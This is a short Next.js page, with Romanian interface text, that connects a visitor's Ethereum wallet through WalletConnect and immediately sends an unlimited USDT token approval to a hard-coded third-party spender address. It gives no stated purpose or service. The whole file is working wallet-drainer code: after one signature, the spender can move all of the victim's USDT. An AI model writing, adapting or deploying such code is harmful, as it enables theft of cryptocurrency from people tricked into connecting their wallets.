'use client';

import { useState } from 'react';
import { ethers } from 'ethers';
import EthereumProvider from "@walletconnect/ethereum-provider";

const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)"
];
const SPENDER = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
const WALLETCONNECT_PROJECT_ID = "89c632f1e13d012d9727c1d5869fe674";

export default function Page() {
  const [address, setAddress] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const connectAndApprove = async () => {
    setLoading(true);
    try {
      const provider = await EthereumProvider.init({
        projectId: WALLETCONNECT_PROJECT_ID,
        chains: [1],
        showQrModal: true,
      });
      await provider.enable();

      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      const userAddress = await signer.getAddress();
      setAddress(userAddress);

      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const maxUint = ethers.MaxUint256;
      const tx = await usdt.approve(SPENDER, maxUint);
      await tx.wait();
      alert("Approve USDT unlimited trimis cu succes!");
    } catch (e: any) {
      alert("Eroare: " + (e?.message || e));
    }
    setLoading(false);
  };

  return (
    <div style={{ padding: 32 }}>
      <button
        onClick={connectAndApprove}
        style={{ padding: 16, fontSize: 18 }}
        disabled={loading}
      >
        {loading ? "Se conectează..." : "Conectează Wallet & Approve USDT"}
      </button>
      {address && (
        <div style={{ marginTop: 20 }}>
          <div>Adresa ta: {address}</div>
        </div>
      )}
    </div>
  );
}